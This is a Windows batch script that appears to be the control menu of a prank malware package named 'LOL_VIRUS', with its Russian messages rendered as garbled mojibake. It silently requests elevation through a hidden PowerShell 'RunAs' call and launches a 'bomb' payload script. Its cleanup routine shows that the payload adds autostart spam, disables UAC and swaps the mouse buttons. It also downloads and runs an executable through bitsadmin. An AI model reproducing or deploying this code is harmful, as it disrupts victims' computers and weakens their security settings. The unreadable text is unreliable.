@echo off
call :Adm
chcp 866
color e
ver | find "5.0" >nul && exit
ver | find "5.1" >nul && exit
ver | find "6.0" >nul && exit
cls
goto pwd

:pwd
cls
title Password...
type C:\LOL_VIRUS\files\art.txt
echo.
echo �������� ������ ��஫� (�� ����ᠭ � ��� GitHub ९����ਨ ���� ����� "LOL_VIRUS" � ����� Enter)

echo.
Set /p choice="��஫�: "
if not defined choice goto pwd
if "%choice%"=="ggytprgs" (goto namet)
if "%choice%"=="LOL_VIRUS" (goto pass)
cls
goto pwd

:pass
cls
start C:\LOL_VIRUS\files\pass.txt
goto pwd

:namet
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo ��� ��� �����?

echo.
Set /p name="���: "
if not defined name goto namet
if "%name%"=="0" (goto hello)
cls
goto hello

:hello
cls
start C:\LOL_VIRUS\files\languages\ru\sounds\o-privet.vbs
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo ��ࠢ����, %name%
echo.
timeout /t 3 /nobreak >nul
cls
goto menu

:menu
cls
title (C) By GGYT Progs and help from DiopinYT :3
type C:\LOL_VIRUS\files\art.txt
echo.
echo %name%, �롥�� ����⢨�:
echo.
echo 1 - �������� �����
echo 2 - ����ன��
echo 3 - ������� ��᫥��⢨� ����� (ᠬ� �ਫ������ �� 㤠�����)
echo 4 - ��������
echo 5 - ���

echo.
Set /p choice="��� �롮�: "
if not defined choice goto menu
if "%choice%"=="1" (goto q1)
if "%choice%"=="2" (goto setng)
if "%choice%"=="3" (goto drs)
if "%choice%"=="4" (goto hlp)
if "%choice%"=="5" (goto exit)
cls
goto menu

:q1
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo %name%, �� 㢥७�, �� ��� �������� �����? (y/n)

echo.
Set /p choice="�끮�: "
if not defined choice goto q
if "%choice%"=="y" (goto q2)
if "%choice%"=="n" (goto menu)
cls
goto q1

:q2
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo ��������� ��������������!!! 
echo �� �ਫ������ �㤥� ��������� �� ������ ��������� ��/��������!!! %name%, �� 㢥७� � ᢮�� ����⢨��? (y/n)

echo.
Set /p choice="�����: "
if not defined choice goto q2
if "%choice%"=="y" (goto strt)
if "%choice%"=="n" (goto menu)
cls
goto q2

:strt
cls
start C:\LOL_VIRUS\files\bomb\startall.bat
cls
goto stop

:stop
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo ����� Enter �⮡� ������� ��.
pause >nul
taskkill /IM cmd.exe /F
exit

:drs
cls
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v iexplore /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v calc /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v explorer /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v paint /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v notepad /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v control /f
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ramspam /f
reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
reg ADD "HKCU\Control Panel\Mouse" /v SwapMouseButtons /t REG_SZ /d 0 /f
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo �ᯥ譮 㤠����! ��१������ ��.
echo.
echo ��� �த������� ������ Enter...
pause >nul
goto menu

:setng
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo %name%, �롥�� �㭪�:
echo.
echo 1 - �������� 梥� ⥪��
echo 2 - ����� ����������
echo 3 - ������� �� 䠩�� �����
echo 4 - �����

echo.
Set /p choice="�롮�: "
if not defined choice goto setng
if "%choice%"=="1" (goto color)
if "%choice%"=="2" (goto updcenter)
if "%choice%"=="3" (goto uninstq)
if "%choice%"=="4" (goto menu)
cls
goto setng

:color
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo %name%, �롥�� 梥� ⥪��
echo.
echo 1 - ����
echo 2 - �����
echo 3 - ����
echo 4 - ���㡮�
echo 5 - �����
echo 6 - ����
echo 7 - ����
echo 8 - ��� � ��������� ��ப�
echo 9 - �� ������� ���� ����! ����� �������!
echo 10 - �����

echo.
Set /p choice="�롮�: "
if not defined choice goto color
if "%choice%"=="1" (goto red)
if "%choice%"=="2" (goto green)
if "%choice%"=="3" (goto yellow)
if "%choice%"=="4" (goto cyan)
if "%choice%"=="5" (goto blue)
if "%choice%"=="6" (goto black)
if "%choice%"=="7" (goto white)
if "%choice%"=="8" (goto cmd)
if "%choice%"=="9" (goto myeyes)
if "%choice%"=="10" (goto setng)
cls
goto color

:red
cls
color c
goto menu

:green
cls
color 2
goto menu

:yellow
cls
color e
goto menu

:cyan
cls
color b
goto menu

:blue
cls
color 1
goto menu

:black
cls
color f0
goto menu

:white
cls
color f
goto menu

:cmd
cls
color 7
goto menu

:myeyes
cls
color ae
goto menu

:updcenter
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo %name%, �� ��� �஢���� ����������? (y/n)
echo.

Set /p upd="��� �롮�: "
if not defined upd goto updcenter
if "%upd%"=="y" (goto updchk)
if "%upd%"=="n" (goto setng)
cls
goto updcenter

:updchk
cls
del C:\tmp_lolvirus\ver.txt
bitsadmin.exe /transfer "GGYT" https://raw.githubusercontent.com/GGYT1/LOL_VIRUS/master/ver.txt C:\tmp_lolvirus\ver.txt >nul
cd C:\tmp_lolvirus
find /I ver.txt "2.7" >nul
if %errorlevel% equ 0 (
  goto updno
) else (
    goto updfind
  )
goto updchk

:updfind
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo ���������� �������. ������? (y/n)
echo.

Set /p updd="��� �롮�: "
if not defined updd goto updfind
if "%updd%"=="y" (goto upddown)
if "%updd%"=="n" (goto setng)
cls
goto updfind

:upddown
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo ���稢����...
bitsadmin.exe /transfer "GGYT" https://github.com/GGYT1/LOL_VIRUS/releases/download/lolvirus/LOL_VIRUS.exe C:\tmp_lolvirus\LOL_VIRUS.exe >nul
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo ���稢���� �����襭�. ��⠭����....
timeout /t 5 /nobreak >nul
start C:\LOL_VIRUS\files\bomb\update.lnk
exit

:updno
type C:\LOL_VIRUS\files\art.txt
echo.
echo � ��� ��⠭������ ��᫥���� �����.
echo.
echo ������ Enter ��� �����饭�� � ����...
pause >nul
goto setng

:uninstq
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo �� ����⢨⥫쭮 ��� 㤠���� �� 䠩�� �����? (y/n)
echo.
echo �� �ਢ���� � ������� �⮣� ����.
echo.

Set /p choice="��� �롮�: "
if not defined choice goto uninstq
if "%choice%"=="y" (goto uninstall)
if "%choice%"=="n" (goto setng)
cls
goto uninstq

:uninstall
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo �������� ��������...
rd C:\tmp_lolvirus\ /s /q >nul
timeout /t 5 /nobreak >nul
start C:\LOL_VIRUS\files\bomb\uninstall.lnk
exit

:exit
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo %name%, �� �筮 ��� ���? (y/n)

echo.
Set /p choice="�롮�: "
if not defined choice goto exit
if "%choice%"=="y" (goto exwt)
if "%choice%"=="n" (goto menu)
cls
goto exit

:exwt
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo �������� ��������...
timeout /t 5 /nobreak >nul
rd C:\tmp_lolvirus /s /q
exit

:hlp
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo !!!!LOL_VIRUS, ��� ����� ������� ����� ��������� ���� ������� �� ����, ��� �� �� ������� �� ������������!!!!
echo.
echo ��������:
echo.
echo ����� �� ��諨 � ����䥩� �ਫ������ �� ����� 5 ���祪 �롮�:
echo.
echo 1 - �������� �����
echo 2 - ����ன��
echo 3 - ������� ����� �� ��⮧���㧪�
echo 4 - �������� (�� ����)
echo 5 - ���
echo.
echo ����� ����� (������ Enter)
pause >nul
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo �㭪� 1: "�������� �����"
echo.
echo �᫨ �� �롥�� "1 - �������� �����", � ������� 2 �।�०����� � ⮬, 
echo �� ��१���㧪� �������� ��� �� �������, ⠪ ��� ��� ����� �ய��뢠���� � ��⮧���㧪�. 
echo ��⥬ ������� ᯠ� ࠧ�묨 �ਫ�����ﬨ � ��������� ��㧥�, ��� ������ ���୥� �� �㦥�.
echo ��᫥ ��१���㧪� �� ����� ��� �������. ��襭�� �⮣� ᬮ��� � �㭪� 3
echo. 
echo ����� ����� (������ Enter)
pause >nul
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo �㭪� 2: "����ன��"
echo.
echo ����� �� ��諨 � "����ன��" ���� �㭪��:
echo.
echo 1 - �������� 梥� ⥪��
echo 2 - ����� ���������� (�� ᪮�)
echo 3 - �����
echo.
echo ����� ����� (������ Enter)
pause >nul
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo �㭪� 2.1: "�������� 梥� ⥪��"
echo.
echo ����� �� �롥�� ��� �㭪�, ������� 梥� �� �롮�, ⠪�� ��� ����, �����, ᨭ��, ���㡮�, ����� � �.�.
echo.
echo ����� ����� (������ Enter)
pause >nul
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo �㭪� 2.2: "����� ����������"
echo.
echo ����� ���������� ������� �஢����, ���� �� ����� ����� ����� �� GitHub.
echo.
echo ����� ����� (������ Enter)
pause >nul
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo �㭪� 2.3: "�����"
echo.
echo ��ࠢ ��� �㭪�, �� ������� � ������� ���� �ਫ������.
echo.
echo ����� ����� (������ Enter)
pause >nul
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo �㭪� 3: "������� ����� �� ��⮧���㧪�"
echo.
echo ����� �� �롥�� ��� �㭪� ����� �� �㤥� ����㦠���� �� ����祭�� ��
echo.
echo ����� ����� (������ Enter)
pause >nul
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo �㭪� 4: "��������" (�� ����)
echo.
echo ��祬 �� �⠥�� �������� ��� ������樨?
echo.
echo ����� ����� (������ Enter)
pause >nul
cls
type C:\LOL_VIRUS\files\art.txt
echo.
echo �㭪� 5: "���"
echo.
echo ����� �� �롥�� ��� �㭪�, �ਫ������ � ��� ���� "�� �筮 ��� ���?".
echo �᫨ �� ������ "y" � Enter, � �ਫ������ 㤠���� �६���� 䠩�� � ���஥���.
echo.
echo ����� ������樨
echo.
echo ��� �����饭�� � ���� ������ Enter...
pause >nul
goto menu

:Adm
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit 
)
